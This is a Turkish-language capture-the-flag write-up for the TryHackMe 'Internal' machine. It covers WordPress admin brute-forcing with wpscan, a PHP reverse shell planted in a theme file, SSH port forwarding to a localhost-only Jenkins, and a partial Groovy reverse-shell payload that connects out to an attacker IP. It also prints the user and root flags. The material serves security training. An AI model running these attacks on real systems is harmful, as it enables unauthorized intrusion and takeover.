# 🕵️‍♂️ Internal - TryHackMe Çözümü (Writeup)

> **Yazar:** Miraç Akkuş (LatenT)
> **Tarih:** Mayıs 2026
> **Hedef:** internal.thm

---

## 📋 Özet

Bu rapor, **Internal** makinesinin ele geçirilme sürecini dökümante eder. Dış dünyadan WordPress zafiyeti ile başlayan saldırı, SSH tünelleme üzerinden iç ağdaki Jenkins servisinin sömürülmesine ve nihayetinde root yetkisine kadar uzanmaktadır. Bu süreçte zayıf şifre politikaları, düz metin (plaintext) olarak saklanan parolalar ve yanlış yapılandırılmış Jenkins erişimi gibi kritik güvenlik hataları tespit edilmiştir.

---

## 🛠️ Kullanılan Araçlar

| Araç | Kullanım Amacı |
| --- | --- |
| `nmap` | Ağ keşfi ve servis taraması |
| `gobuster` / `dirb` | Dizin listeleme (Directory brute-force) |
| `wpscan` | WordPress zafiyet taraması ve kaba kuvvet saldırısı |
| `ssh` / `ssh -L` | Uzaktan erişim ve yerel port yönlendirme |
| `netcat` | Reverse shell dinleyici |
| `Jenkins Script Console` | Groovy tabanlı RCE (Uzaktan komut çalıştırma) |

---

## 🔍 Aşama 1: Keşif ve Bilgi Toplama

### Ağ Taraması

Hedef sistemdeki açık portları ve servisleri belirlemek için nmap kullandım:

```bash
nmap -sC -sV -oA nmap/internal.thm internal.thm

```

### Bulgular

| Port | Servis | Versiyon | Notlar |
| --- | --- | --- | --- |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu | Standart erişim noktası |
| 80 | HTTP | Apache httpd 2.4.29 | WordPress sitesi tespit edildi |

---

## 🌐 Aşama 2: İlk Giriş (WordPress Sızma)

### Web Keşfi

`gobuster` ile yapılan taramada `/blog` dizini altında bir WordPress kurulumu bulundu.

### Şifre Kırma (Brute-Force)

WordPress kullanıcılarını listeleyip `admin` hesabı üzerinde kaba kuvvet saldırısı başlattım:

```bash
wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin

```

**Sonuç:** Yönetici (Admin) bilgileri başarıyla ele geçirildi.

### Web Shell Yükleme

1. WordPress yönetici paneline giriş yapıldı.
2. **Appearance (Görünüm) → Theme Editor → 404.php** sayfasına gidildi.
3. Şablon kodu bir PHP reverse shell payload'ı ile değiştirildi.
4. Olmayan bir sayfa ziyaret edilerek shell tetiklendi.
5. `nc -lvnp 4444` ile bağlantı sağlandı.

**Erişim Durumu:** `www-data` kullanıcısı olarak sisteme girildi.

---

## 🔄 Aşama 3: Yatay Hareket (Kullanıcı Değişimi)

### Yetki Yükseltme Keşfi

Sistemde yapılan incelemede `/opt` dizini altında açık unutulmuş bir yedek dosyası bulundu:

```bash
cat /opt/wp-save.txt

```

**Bulgu:** `aubreanna` kullanıcısına ait SSH şifresi düz metin olarak tespit edildi.

### SSH Erişimi ve User Flag

```bash
ssh aubreanna@internal.thm
cat /home/aubreanna/user.txt

```

**User Flag:** `ee11cbb19052e40b07aac0ca060c23ee`

---

## 🚇 Aşama 4: Pivoting (İç Ağda İlerleme)

### Yerel Servis Keşfi

İçeride yapılan `netstat` taramasında Jenkins servisinin sadece `localhost` üzerinde çalıştığı görüldü:

```bash
netstat -tulpn | grep 8080
# 127.0.0.1:8080 - Jenkins CI/CD Sunucusu

```

### SSH Yerel Port Yönlendirme (Local Port Forwarding)

Jenkins'e kendi makinemden erişebilmek için bir SSH tüneli oluşturdum:

```bash
ssh -L 9999:127.0.0.1:8080 aubreanna@internal.thm

```

**Erişim:** Artık Jenkins paneline `http://localhost:9999` üzerinden erişebiliyoruz.

---

## ⚙️ Aşama 5: Jenkins Sömürüsü

### Script Console RCE

Jenkins'in Script Console (`/script`) arayüzü Groovy kodları çalıştırmamıza izin veriyor. Bu özelliği bir reverse shell almak için kullandım:

**Groovy Payload:**

```groovy
String host="10.10.14.2"; // Kendi IP adresin
int port=4445;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
// ... (Kodun devamı)

```

**Sonuç:** `jenkins` kullanıcısı olarak yeni bir shell elde edildi.

---

## 🏁 Aşama 6: Tam Yetki (Root)

### Şifre Avcılığı

Jenkins kullanıcısı altındaki dizinleri incelerken `/opt` altında yine bir not bulundu:

```bash
cat /opt/note.txt

```

**Bulgu:** "Will" kullanıcısı tarafından root şifresi buraya not edilmiş.

### Root Erişimi

```bash
su root
# Bulunan şifre ile giriş yapıldı
id
# uid=0(root)
cat /root/root.txt

```

**Root Flag:** `63a9f0ea7bb98050796b649e85481845`

---

## 🗺️ Saldırı Yolu Özeti

1. **WordPress:** Admin paneli ele geçirildi ve PHP Shell yüklendi.
2. **Kullanıcı Pivoting:** `/opt` dosyasından `aubreanna` şifresi alındı.
3. **SSH Tunneling:** İçeride gizli olan Jenkins portu dışarı taşındı.
4. **Jenkins RCE:** Groovy script ile `jenkins` kullanıcısına geçildi.
5. **Root:** Başka bir not dosyasından bulunan root şifresiyle sistem tamamen ele geçirildi.

---

## 📚 Alınan Dersler

* **Şifre Hijyeni:** Düz metin olarak saklanan şifreler iç ağ saldırılarının 1 numaralı sebebidir.
* **Derinlemesine Savunma:** Jenkins gibi kritik servisler sadece yerel ağda (localhost) çalışmasına güvenilerek korunmasız bırakılmamalıdır.
* **Tünelleme:** SSH tünelleme yeteneği, iç ağdaki servisleri keşfetmek için vazgeçilmezdir.

---

**Yazar:** Miraç Akkuş (LatenT)

**Tarih:** Mayıs 2026
